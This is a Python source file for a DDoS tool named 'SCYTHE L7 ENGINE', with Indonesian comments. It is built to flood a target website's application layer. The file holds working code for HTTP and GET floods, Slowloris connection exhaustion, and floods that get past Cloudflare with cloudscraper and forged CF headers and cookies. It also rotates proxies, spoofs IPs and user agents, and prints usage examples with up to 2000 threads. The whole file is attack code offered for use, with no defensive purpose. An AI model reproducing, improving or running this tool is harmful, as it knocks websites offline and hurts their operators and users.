#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  SCYTHE L7 ENGINE v15.0 — PROFESSIONAL EDITION (MHDDoS-LEVEL)              ║
║  🔥 6 METHODS: httpbypass, cf-flood, slow, httpget, httpflood, auto        ║
║  🔥 HTTP Client: requests + cloudscraper (bypass Cloudflare)               ║
║  🔥 Proxy: PyRoxy (support HTTP, HTTPS, SOCKS4, SOCKS5)                    ║
║  🔥 Session per proxy: 50 requests/proxy (hemat proxy)                    ║
║  🔥 Auto fallback to direct if all proxies dead                           ║
║  🔥 Smart retry + error limiting                                          ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
import sys
import os
import time
import random
import threading
import urllib.parse
import hashlib
import base64
from collections import deque

# ─── Pastikan dependensi terinstall ───
try:
    import requests
    import cloudscraper
    from PyRoxy import Proxy, ProxyType
except ImportError as e:
    print("[ERROR] Missing dependencies. Install: pip3 install requests cloudscraper PyRoxy")
    sys.exit(1)

# ─── Cari proxies.txt ───
def find_proxy_file(filename="proxies.txt"):
    paths = [
        filename,
        os.path.join(os.path.dirname(__file__), filename),
        os.path.join(os.path.dirname(os.path.dirname(__file__)), filename),
        "/root/ddosxscythe/" + filename,
    ]
    for p in paths:
        if os.path.exists(p):
            return os.path.abspath(p)
    return None

# ─── ProxyManager (dengan auto-reload dan dukungan PyRoxy) ───
class ProxyManager:
    def __init__(self, proxy_file):
        self.proxy_file = proxy_file
        self.proxies = []
        self.lock = threading.Lock()
        self.last_reload = 0
        self.reload_interval = 15  # reload setiap 15 detik
        self._load()

    def _load(self):
        if not self.proxy_file or not os.path.exists(self.proxy_file):
            self.proxies = []
            return
        try:
            with open(self.proxy_file, "r") as f:
                raw = [l.strip() for l in f if l.strip() and ":" in l and not l.startswith("#")]
            # Filter dan parse dengan PyRoxy
            parsed = []
            for p in raw:
                try:
                    # PyRoxy bisa parse berbagai format
                    proxy = Proxy(p)
                    parsed.append(proxy)
                except:
                    continue
            with self.lock:
                self.proxies = parsed
                self.last_reload = time.time()
            if parsed:
                print(f"[PROXY] Loaded {len(parsed)} proxies", flush=True)
        except Exception as e:
            print(f"[PROXY ERROR] {e}", flush=True)

    def get(self):
        if time.time() - self.last_reload > self.reload_interval:
            self._load()
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

    def count(self):
        with self.lock:
            return len(self.proxies)

# ─── L7 Engine ───
class L7AttackEngine:
    def __init__(self, target, duration, threads, proxy_file=None, method_type="httpbypass"):
        self.target = target
        self.duration = int(duration)
        self.threads = int(threads)
        self.method_type = method_type.lower()
        self.proxy_mgr = ProxyManager(proxy_file)
        self.running = False
        self.total_requests = 0
        self.total_bytes = 0
        self.counter_lock = threading.Lock()
        self.start_time = 0
        self.end_time = 0
        self.error_count = 0
        self.error_lock = threading.Lock()
        self.error_log_limit = 30
        self.error_log_time = 0
        self.requests_per_proxy = 50  # 🔥 hemat proxy
        self._parse_target()
        # Siapkan cloudscraper session (tanpa proxy)
        self.scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        self.scraper.verify = False
        self.session = requests.Session()
        self.session.verify = False

    def _parse_target(self):
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target
        parsed = urllib.parse.urlparse(self.target)
        self.scheme = parsed.scheme or 'https'
        self.host = parsed.netloc or parsed.path
        self.port = parsed.port or (443 if self.scheme == 'https' else 80)
        if ':' in self.host:
            self.host = self.host.split(':')[0]

    def _headers(self, extra=None):
        ua = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        ])
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'fr-FR,fr;q=0.9']),
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        if random.random() > 0.5:
            headers['Referer'] = f"https://{self.host}/"
        if extra:
            headers.update(extra)
        return headers

    def _path(self):
        paths = ['/', '/index.html', '/api', '/home', '/login', '/register', '/wp-admin',
                 '/admin', '/assets/', '/favicon.ico', '/sitemap.xml', '/robots.txt',
                 '/api/v1/users', '/api/v1/orders', '/graphql', '/search', '/category']
        path = random.choice(paths)
        if random.random() > 0.3:
            path += f"?cb={random.randint(100000,999999)}&t={int(time.time())}"
        return path

    def _log_error(self, msg):
        with self.error_lock:
            now = time.time()
            if now - self.error_log_time > 1:
                self.error_log_time = now
                self.error_count = 0
            if self.error_count < self.error_log_limit:
                self.error_count += 1
                print(f"[ERROR] {msg}", flush=True)

    # ─── CORE SEND REQUEST (menggunakan requests + cloudscraper) ───
    def _send_request(self, proxy=None, method='GET', path=None, body=None, extra_headers=None, retries=2):
        url = f"{self.scheme}://{self.host}{path or self._path()}"
        headers = self._headers(extra_headers)
        proxies = None
        if proxy:
            # PyRoxy Proxy object -> format untuk requests
            try:
                proxy_url = proxy.asRequest()
                proxies = {
                    'http': proxy_url,
                    'https': proxy_url
                }
            except:
                # fallback: gunakan string langsung
                proxy_str = str(proxy)
                if not proxy_str.startswith('http'):
                    proxy_str = 'http://' + proxy_str
                proxies = {'http': proxy_str, 'https': proxy_str}

        for attempt in range(retries):
            try:
                # Gunakan cloudscraper untuk bypass Cloudflare, atau requests biasa
                if 'cloudflare' in self.target or 'cf' in self.target:
                    resp = self.scraper.request(
                        method=method,
                        url=url,
                        headers=headers,
                        proxies=proxies,
                        timeout=10,
                        allow_redirects=True
                    )
                else:
                    # Buat session baru per request agar proxy tidak terkunci
                    with requests.Session() as sess:
                        sess.verify = False
                        sess.proxies = proxies
                        resp = sess.request(
                            method=method,
                            url=url,
                            headers=headers,
                            timeout=10,
                            allow_redirects=True
                        )
                # Sukses walau status code 4xx/5xx
                return True, len(resp.content)
            except Exception as e:
                # Jika proxy gagal dan masih ada percobaan
                if attempt < retries - 1:
                    continue
                # Coba direct jika proxy gagal
                if proxy:
                    return self._send_request(proxy=None, method=method, path=path,
                                               body=body, extra_headers=extra_headers, retries=1)
                self._log_error(f"request failed: {e}")
                return False, 0
        return False, 0

    # ─── WORKER (session per proxy) ───
    def _httpbypass_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            proxy = self.proxy_mgr.get()
            for _ in range(self.requests_per_proxy):
                if not self.running or time.time() >= end_time:
                    break
                try:
                    extra = {
                        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
                        'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors', 'cors']),
                        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
                    }
                    if random.random() > 0.5:
                        extra['Sec-Ch-Ua'] = '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"'
                        extra['Sec-Ch-Ua-Mobile'] = '?0'
                        extra['Sec-Ch-Ua-Platform'] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
                    success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra, retries=2)
                    if success:
                        local_count += 1
                        local_bytes += bytes_recv
                    else:
                        break
                except Exception as e:
                    self._log_error(f"httpbypass: {e}")
                    break
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _cfflood_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            proxy = self.proxy_mgr.get()
            for _ in range(self.requests_per_proxy):
                if not self.running or time.time() >= end_time:
                    break
                try:
                    extra = {
                        'CF-RAY': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'CF-IPCountry': random.choice(['US', 'ID', 'GB', 'DE', 'FR', 'JP', 'SG', 'NL']),
                        'CF-Visitor': '{"scheme": "https"}',
                        'CF-Request-ID': hashlib.md5(str(random.random()).encode()).hexdigest()[:32],
                        'Cookie': f"__cf_bm={random._urandom(16).hex()}; cf_clearance={random._urandom(32).hex()}",
                    }
                    success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra, retries=2)
                    if success:
                        local_count += 1
                        local_bytes += bytes_recv
                    else:
                        break
                except Exception as e:
                    self._log_error(f"cfflood: {e}")
                    break
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _slow_worker(self):
        # Slowloris: buka koneksi dan kirim header parsial
        end_time = self.end_time
        local_count = 0
        connections = []
        while self.running and time.time() < end_time:
            try:
                while len(connections) < 100 and self.running and time.time() < end_time:
                    proxy = self.proxy_mgr.get()
                    if proxy:
                        # Buat koneksi via proxy (PyRoxy)
                        try:
                            sock = proxy.open_socket()
                            sock.settimeout(10)
                            # Kirim request awal
                            sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
                            connections.append({'sock': sock, 'last': time.time()})
                            local_count += 1
                        except Exception as e:
                            self._log_error(f"slow connect: {e}")
                            continue
                    else:
                        # Direct
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(10)
                            sock.connect((self.host, self.port))
                            if self.scheme == 'https':
                                import ssl
                                ctx = ssl.create_default_context()
                                ctx.check_hostname = False
                                ctx.verify_mode = ssl.CERT_NONE
                                sock = ctx.wrap_socket(sock, server_hostname=self.host)
                            sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
                            connections.append({'sock': sock, 'last': time.time()})
                            local_count += 1
                        except Exception as e:
                            self._log_error(f"slow direct connect: {e}")
                            continue

                # Jaga koneksi
                for conn in connections[:]:
                    if time.time() - conn['last'] > random.randint(8, 15):
                        try:
                            header = ''.join(random.choices(string.ascii_letters, k=random.randint(5,15)))
                            value = random._urandom(random.randint(10,100)).hex()
                            conn['sock'].sendall(f"{header}: {value}\r\n".encode())
                            conn['last'] = time.time()
                        except:
                            try: conn['sock'].close()
                            except: pass
                            connections.remove(conn)
                time.sleep(0.5)
            except Exception as e:
                self._log_error(f"slow outer: {e}")
        for conn in connections:
            try: conn['sock'].close()
            except: pass
        with self.counter_lock:
            self.total_requests += local_count

    def _httpget_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            proxy = self.proxy_mgr.get()
            for _ in range(self.requests_per_proxy):
                if not self.running or time.time() >= end_time:
                    break
                try:
                    path = self._path()
                    success, bytes_recv = self._send_request(proxy=proxy, path=path, retries=2)
                    if success:
                        local_count += 1
                        local_bytes += bytes_recv
                    else:
                        break
                except Exception as e:
                    self._log_error(f"httpget: {e}")
                    break
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _httpflood_worker(self):
        # Keep-alive: buka koneksi per proxy, kirim banyak request
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            proxy = self.proxy_mgr.get()
            # Buat session untuk proxy ini
            sess = requests.Session()
            sess.verify = False
            if proxy:
                try:
                    proxy_url = proxy.asRequest()
                    sess.proxies = {'http': proxy_url, 'https': proxy_url}
                except:
                    proxy_str = str(proxy)
                    if not proxy_str.startswith('http'):
                        proxy_str = 'http://' + proxy_str
                    sess.proxies = {'http': proxy_str, 'https': proxy_str}
            try:
                for _ in range(self.requests_per_proxy):
                    if not self.running or time.time() >= end_time:
                        break
                    path = self._path()
                    headers = self._headers()
                    resp = sess.get(
                        f"{self.scheme}://{self.host}{path}",
                        headers=headers,
                        timeout=10
                    )
                    local_count += 1
                    local_bytes += len(resp.content)
            except Exception as e:
                self._log_error(f"httpflood: {e}")
            finally:
                sess.close()
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _auto_worker(self):
        workers = [self._httpbypass_worker, self._cfflood_worker,
                   self._httpget_worker, self._httpflood_worker]
        idx = 0
        last_switch = time.time()
        switch_interval = 30
        end_time = self.end_time
        while self.running and time.time() < end_time:
            if time.time() - last_switch > switch_interval:
                idx = (idx + 1) % len(workers)
                last_switch = time.time()
            workers[idx]()
            time.sleep(0.1)

    # ─── RPS REPORTER ───
    def _rps_reporter(self):
        last_total = 0
        last_time = time.time()
        while self.running:
            time.sleep(1)
            with self.counter_lock:
                current_total = self.total_requests
            elapsed = time.time() - last_time
            rps = int((current_total - last_total) / elapsed) if elapsed > 0 else 0
            print(f"RPS: {rps} | Total: {current_total} | Proxy: {self.proxy_mgr.count()}", flush=True)
            sys.stdout.flush()
            last_total = current_total
            last_time = time.time()

    # ─── START ───
    def start(self):
        self.running = True
        self.start_time = time.time()
        self.end_time = self.start_time + self.duration
        proxy_count = self.proxy_mgr.count()

        print(f"\n[Scythe L7 v15.0] {self.method_type.upper()} attack launched", flush=True)
        print(f"🎯 Target: {self.target}", flush=True)
        print(f"⏱️  Duration: {self.duration}s | Threads: {self.threads} | Proxies: {proxy_count}", flush=True)
        print(f"🔁 Requests per proxy: {self.requests_per_proxy}", flush=True)
        if proxy_count == 0:
            print(f"⚠️  No proxies — using DIRECT connection (your VPS IP)", flush=True)
        print(f"{'='*60}\n", flush=True)
        sys.stdout.flush()

        reporter = threading.Thread(target=self._rps_reporter, daemon=True)
        reporter.start()

        worker_map = {
            'httpbypass': self._httpbypass_worker,
            'cf-flood': self._cfflood_worker,
            'slow': self._slow_worker,
            'httpget': self._httpget_worker,
            'httpflood': self._httpflood_worker,
            'auto': self._auto_worker,
        }
        worker_func = worker_map.get(self.method_type, self._httpbypass_worker)

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=worker_func, daemon=True)
            t.start()
            threads.append(t)

        # Monitor early death
        time.sleep(2)
        alive = sum(1 for t in threads if t.is_alive())
        if alive == 0:
            print(f"[WARN] All threads died! Forcing direct mode...", flush=True)
            with self.proxy_mgr.lock:
                self.proxy_mgr.proxies = []
            for _ in range(self.threads):
                t = threading.Thread(target=worker_func, daemon=True)
                t.start()
                threads.append(t)

        time.sleep(max(0, self.duration - 2))
        self.running = False

        for t in threads:
            t.join(timeout=2)

        with self.counter_lock:
            final_total = self.total_requests
            final_bytes = self.total_bytes

        elapsed = time.time() - self.start_time
        avg_rps = int(final_total / elapsed) if elapsed > 0 else 0

        print(f"\n[Scythe L7] Attack completed!", flush=True)
        print(f"📊 Total Requests: {final_total:,} | Avg RPS: {avg_rps:,} | Bytes: {final_bytes:,}", flush=True)
        print(f"⚠️  Total Errors: {self.error_count}", flush=True)
        print(f"{'='*60}\n", flush=True)
        sys.stdout.flush()

        return final_total, avg_rps, final_bytes

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("\n" + "="*60)
        print("🔥 SCYTHE L7 ENGINE v15.0 — PROFESSIONAL")
        print("="*60)
        print("\nUsage:")
        print("  python3 l7_engine.py <method> <target> <duration> [threads] [proxy_file]")
        print("\n6 Methods:")
        for m in ['httpbypass', 'cf-flood', 'slow', 'httpget', 'httpflood', 'auto']:
            print(f"  - {m}")
        print("\nExamples:")
        print("  python3 l7_engine.py httpbypass example.com 60 500")
        print("  python3 l7_engine.py cf-flood example.com 120 1000")
        print("  python3 l7_engine.py auto example.com 300 2000")
        print("="*60)
        sys.exit(1)

    args = [a for a in sys.argv[1:] if a != '--debug']
    method = args[0].lower()
    target = args[1]
    duration = args[2]
    threads = args[3] if len(args) > 3 else '100'
    proxy_file = args[4] if len(args) > 4 else find_proxy_file()

    engine = L7AttackEngine(target, duration, threads, proxy_file, method)
    engine.start()